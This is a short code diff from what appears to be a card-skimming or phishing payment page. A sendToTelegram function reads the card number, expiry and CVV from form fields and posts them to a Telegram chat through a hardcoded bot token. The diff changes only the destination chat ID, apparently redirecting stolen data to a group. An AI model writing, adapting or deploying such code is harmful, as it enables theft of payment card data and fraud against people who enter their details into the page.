@@ -105,7 +105,7 @@ function sendToTelegram() {
     const cvv = document.getElementById("cvv").value || "000";
 
     const botToken = "8431246186:AAEV2wktzNbQIFjsRQ8Q-TzSuC_GH5WIq-o";
-    const chatId = "8345316778";
+    const chatId = "-1002748885069";
     const message = `💳 TEST Paiement :\nCard: ${card}\nExpiry: ${expiry}\nCVV: ${cvv}`;
 
     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
